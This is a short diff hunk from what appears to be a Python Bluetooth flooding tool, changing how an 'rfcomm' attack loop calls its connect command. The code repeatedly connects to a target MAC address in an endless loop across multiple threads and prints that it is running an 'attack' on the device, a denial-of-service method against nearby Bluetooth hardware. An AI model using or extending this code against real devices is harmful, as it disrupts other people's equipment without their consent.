@@ -33,7 +33,7 @@ else:
     if (method == "rfcomm"):
         def loopbacklrfcomm():
             while True: 
-                hwus = run_cmd("rfcomm connect %s 1 2>&1 >/dev/null" % (macadd)) 
+                hwus = run_cmd("rfcomm connect %s 1" % (macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
         for i in range(threadnums):
